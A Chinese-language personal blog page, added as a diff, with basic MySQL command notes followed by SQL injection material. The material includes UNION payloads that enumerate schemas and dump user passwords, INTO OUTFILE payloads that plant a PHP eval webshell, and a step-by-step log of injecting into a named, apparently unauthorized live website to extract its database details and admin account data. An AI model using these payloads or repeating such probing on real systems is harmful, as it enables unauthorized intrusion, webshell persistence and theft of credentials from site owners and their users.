@@ -1,0 +1,246 @@
+<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>SQL - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="/uploads/background.JPG"><div class="post-title"><h1 class="title">SQL</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>13 Minutes</li><li><i class="icon icon-calendar"></i>December 31, 2019</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="常见的-SQL-语句"><a href="#常见的-SQL-语句" class="headerlink" title="常见的 SQL 语句"></a>常见的 SQL 语句</h3><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><ul>
+<li><p>查所有数据库</p>
+<p>show databases;</p>
+</li>
+<li><p>创建数据库</p>
+<p>create database new;</p>
+</li>
+<li><p>查看数据库</p>
+<p>show create database new;</p>
+</li>
+<li><p>创建数据库制定字符集</p>
+<p>create database new character set utf8/gbk;</p>
+</li>
+<li><p>删除数据库</p>
+<p>drop database new;</p>
+</li>
+<li><p>使用数据库</p>
+<p>use new;</p>
+</li>
+</ul>
+<h4 id="表"><a href="#表" class="headerlink" title="表"></a>表</h4><ul>
+<li><p>创建表</p>
+<p>create table new(</p>
+<p>id int,</p>
+<p>name carchar(10)</p>
+<p>);</p>
+</li>
+<li><p>查看所有表</p>
+<p>show tables;</p>
+</li>
+<li><p>查看单个表属性</p>
+<p>show create table new;</p>
+</li>
+<li><p>查看表字段</p>
+<p>describe new;</p>
+</li>
+<li><p>创建表制定引擎和字符集</p>
+<p>create table new(</p>
+<p>id int,</p>
+<p>name varchar(10)</p>
+<p>)</p>
+<p>engine = myisam/innodb charset = utf8/gbk;</p>
+</li>
+</ul>
+<h4 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h4><ul>
+<li><p>修改表名</p>
+<p>rename table new to new1;</p>
+</li>
+<li><p>修改表属性</p>
+<p>alter table new engine = myisam/innodb charset = utf8/bgk;</p>
+</li>
+<li><p>添加表字段</p>
+<p>alter table new add age int first;</p>
+<p>alter table new add age int after XXX;</p>
+</li>
+<li><p>删除表字段</p>
+<p>alter table new drop age;</p>
+</li>
+<li><p>修改表字段名和类型</p>
+<p>alter table new change age sex int;</p>
+</li>
+<li><p>修改表的类型和位置</p>
+<p>alter table new modify age int;</p>
+<p>alter table new modify age int first;</p>
+<p>alter table new modify age int after XX;</p>
+</li>
+<li><p>删除表</p>
+<p>drop table new;</p>
+</li>
+</ul>
+<h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><ul>
+<li><p>插入数据</p>
+<ul>
+<li><p>insert into new values(</p>
+<p>5,’xiaoming’,null</p>
+<p>);</p>
+</li>
+<li><p>insert into new (id,name) values (2,’aa’);</p>
+</li>
+<li><p>insert into new values (5,’xiaoming’,null),(6,’xiaohong’,null);</p>
+</li>
+<li><p>insert into new (id,name) values (2,’aa’)(3,’bb’)(4,’cc’);</p>
+</li>
+</ul>
+</li>
+<li><p>查询</p>
+<ul>
+<li>select * from new;</li>
+<li>select name from new;</li>
+<li>select * from new where id = 1;</li>
+</ul>
+</li>
+<li><p>修改</p>
+<p>update new set age = 100 where id = 10;</p>
+</li>
+<li><p>删除</p>
+<p>delete from new where id = 10;</p>
+</li>
+</ul>
+<h4 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h4><ul>
+<li>判断有无注入点<ul>
+<li>‘</li>
+<li>1’ and ‘1’=’1</li>
+<li>1’ and ‘1’=’2</li>
+</ul>
+</li>
+<li>猜解字段数<ul>
+<li>1’ order by 2#</li>
+</ul>
+</li>
+<li>确定显示的位置<ul>
+<li>1’ union select 1,2#</li>
+</ul>
+</li>
+<li>查询当前数据库及版本<ul>
+<li>1’ union select version(),database()#</li>
+</ul>
+</li>
+<li>获取数据库中的表<ul>
+<li>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</li>
+</ul>
+</li>
+<li>获取表中的字段名<ul>
+<li>1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#</li>
+</ul>
+</li>
+<li>获得字段中的数据<ul>
+<li>1’ union select user,password from users#</li>
+</ul>
+</li>
+</ul>
+<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>注入分为 int 型和字符串型。</p>
+<p>select * from admin where id = 1 and 1=1 –&gt; int 型</p>
+<p>select * from admin where id = 1 and ‘1’=’1 –&gt; 字符串型</p>
+<ol>
+<li><p>布尔注入        //返回真或假</p>
+</li>
+<li><p>联合注入       //一起查询</p>
+<p><strong>需要获取字段的总数</strong></p>
+<p>group by</p>
+<p>order by</p>
+<p>联合查询 union select 字段，字段，字段</p>
+<p><strong>获取数据库</strong></p>
+<p>select database();</p>
+<p><strong>获取数据库里面的表</strong></p>
+<ul>
+<li><p>跨库</p>
+<p>select * from new.student where number = 2;</p>
+</li>
+<li><p>查看表</p>
+<p>-1‘ union select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database();</p>
+<p>如果限制只显示一行，就用条件使第一行不成立：</p>
+</li>
+</ul>
+</li>
+</ol>
+<p><strong>获取表里的列</strong></p>
+<p>-1’ union select 1,column_name from <strong>information_schema.columns</strong> where table_name=’users’ limit 1,1#</p>
+<p><strong>获取表里面的字段</strong></p>
+<p>-1‘ union select 1,</p>
+<ol start="3">
+<li>延时注入      //定时器查询</li>
+<li>报错注入      //报错但是信息是我们需要的</li>
+</ol>
+<h4 id="limit-和-offset-的用法："><a href="#limit-和-offset-的用法：" class="headerlink" title="limit 和 offset 的用法："></a>limit 和 offset 的用法：</h4><ul>
+<li><p>limit</p>
+<ul>
+<li><p>select * from users limit 0,1;</p>
+<p>0 表示初始位置，1表示偏移量</p>
+</li>
+<li><p>select * from users limit 10;</p>
+<p>检索前十行数据</p>
+</li>
+</ul>
+</li>
+<li><p>offset</p>
+<p>select * from users limit 1 offset 0;</p>
+<p>用法与 limit 相似，但是位置正好相反。</p>
+</li>
+</ul>
+<h4 id="mysql-写入一句话木马"><a href="#mysql-写入一句话木马" class="headerlink" title="mysql 写入一句话木马"></a>mysql 写入一句话木马</h4><p>前提是有 root 权限，且知道服务器的 web 绝对路径（目录具有写权限），没有配置 -secure-file-priv。</p>
+<p>mysql 查询语句执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 正常写法</span><br><span class="line">select &quot;&lt;?php @eval($_POST[&apos;sb&apos;]);?&gt;&quot; into outfile &quot;/phpstudy/www/uploads/sb.php&quot;</span><br><span class="line"></span><br><span class="line">// 注入时可 union 联合查询时</span><br><span class="line">?id=13 and 1=2 union select 1,2,3,4,5 &quot;&lt;?php @eval($_POST[&apos;sb&apos;]);?&gt;&quot; into outfile &quot;/phpstudy/www/uploads/sb.php&quot;</span><br><span class="line"></span><br><span class="line">// 不可 union 联合查询时</span><br><span class="line">?id=13) into outfile &quot;/phpstudy/www/uploads/sb.php&quot; fields terminated by &quot;&lt;?php @eval(@_POST[SBSB]);?&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<ol>
+<li><p>绝对路径的猜解。</p>
+</li>
+<li><p>into outfile 后面的路径，比如说 “c:\wamp\uploads\muma.php” 有时需要变成 “c:\\wamp\\uploads\\muma.php”（对反斜杠做了一次转义）</p>
+</li>
+<li><p>路径可以编码十六进制。</p>
+</li>
+<li><p>实际利用时候的 payload 是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select 1,2 &apos;&lt;?php @eval($_post[SB]);?&gt;&apos; into outfile &apos;/phpstudy/www/uploads/a.php&apos;</span><br></pre></td></tr></table></figure>
+
+<p>但是写入的内容只有联合查询查出的 1、2，一句话没有写进去，改 payload 为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; union select 1,&apos;&lt;?php @eval($_post[SB]);?&gt;&apos; into outfile &apos;/phpstudy/www/uploads/a.php&apos;</span><br></pre></td></tr></table></figure>
+
+<p>写入成功，这里需要注意一下。</p>
+</li>
+</ol>
+<h2 id="一次-mysql-注入实战"><a href="#一次-mysql-注入实战" class="headerlink" title="一次 mysql 注入实战"></a>一次 mysql 注入实战</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// Target</span><br><span class="line">http://www.ampak.com.tw</span><br><span class="line"></span><br><span class="line">// 该网站利用工具注入会重置，初步判断有一定防护。</span><br></pre></td></tr></table></figure>
+
+<p>偶然间找到一个台湾站，简单利用单引号手测了一下发现会返回 sql 报错，判断 product.php?id= 参数含有注入。</p>
+<p>接着继续 and 1=1 / and 1=2 测试返回连接重置，判断可能是对这两条语句做了过滤，于是换语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">product.php?id=13 and 12334=12334</span><br><span class="line">// 返回正常</span><br><span class="line"></span><br><span class="line">product.php?id=13 and 12334=12335</span><br><span class="line">// 返回报错</span><br></pre></td></tr></table></figure>
+
+<p>说明页面存在注入。</p>
+<p>接着继续 order by 猜解字段数，结果是 8：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// order by 是按表中某字段排列表中的数据</span><br><span class="line">// group by 是按某些字段分类</span><br><span class="line"></span><br><span class="line">product.php?id=13 order by 8</span><br><span class="line">// 返回正常</span><br><span class="line"></span><br><span class="line">product.php?id=13 order by 9</span><br><span class="line">// 返回报错</span><br></pre></td></tr></table></figure>
+
+<p>直接上 union 联合查询，查询数据库，版本，用户等信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=13&apos; union select 1,2,3,4,5,6,7,database()</span><br><span class="line">// 返回会在单引号处报错，后面的语句没有带入执行，想了想换成别的报错方式</span><br><span class="line"></span><br><span class="line">?id=13 and 12334=12335 UNION SELECT 1,2,3,4,5,6,7,database()</span><br><span class="line">// 返回数据库为 ampak_2016_kr</span><br><span class="line">// 其中 3，4，7，8 是字符段</span><br><span class="line">// 猜解出版本为 mysql 5.5.34</span><br><span class="line">// 用户 ampak_web@localhost</span><br><span class="line">// 数据库安装路径 /var/lib/mysql/</span><br><span class="line">// mysql 安装路径 /usr</span><br><span class="line">// 操作系统 Linux</span><br></pre></td></tr></table></figure>
+
+<p>用户不是 root 权限，有点遗憾，直接猜解表、列、数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 数据库最好十六进制编码</span><br><span class="line">// 利用 group_concat() 注入时会直接重置页面，怀疑是防火墙做了策略，只好配合 limit 一个一个猜解。</span><br><span class="line">// 猜解表</span><br><span class="line">?id=13 and 12345=54323 union select 1,2,3,4,5,6,table_name,8 from information_schema.tables where table_schema=ampak_2016_kr limit 0,1</span><br><span class="line"></span><br><span class="line">// 猜解列</span><br><span class="line">?id=13 and 12345=54323 union select 1,2,3,4,5,6,column_name,8 from information_schema.columns where table_name=admin 0,1</span><br><span class="line"></span><br><span class="line">// 猜解数据</span><br><span class="line">?id=13 and 12345=54323 union select 1,2,3,4,5,6,account,8 from ampak_2016_kr.admin limit 0,1</span><br></pre></td></tr></table></figure>
+
+<h4 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h4><ol>
+<li>如果参数可能存在注入，记得要判断注入类型，and 1=1 和 and ‘1’=’1’ 都试试。</li>
+<li>因为代码不同的缘故，有的注入在 payload 最后需要加注释，有的不需要加。</li>
+<li>有的注入可能过滤了 and 1=1，这个时候可以换其他的数值来测试一下。</li>
+<li>当不能 group_concat() 全部猜解表或列时，可以尝试单个表、列来猜解。</li>
+</ol>
+<h2 id="sqlmap-POST-型注入用法"><a href="#sqlmap-POST-型注入用法" class="headerlink" title="sqlmap POST 型注入用法"></a>sqlmap POST 型注入用法</h2><ol>
+<li><p>burp 截断数据包</p>
+</li>
+<li><p>右键 copy to file 保存为文件</p>
+</li>
+<li><p>执行 sqlmap</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./sqlmap.py -r ~/a.txt</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck4t9ev4t0004g2oz9zd9dm3d" data-title="SQL" data-url="http://yoursite.com/2019/12/31/SQL/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
+var duoshuoQuery = {short_name: siteName};
+(function() {
+  var ds = document.createElement('script');
+  ds.type = 'text/javascript';ds.async = true;
+  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+  ds.charset = 'UTF-8';
+  (document.getElementsByTagName('head')[0] 
+  || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2019/12/31/study/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2019/12/31/MS17-010漏洞复现/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/NickYan7" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a href="https://www.baidu.com" title="wechat" target="_blank"><i class="icon icon-wechat"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2019 Naykcin's Page</p></div></div></div><script>var wrap = document.getElementById('wrap');
+window.onload = function () {
+  wrap.className += ' done';
+}</script></body></html>
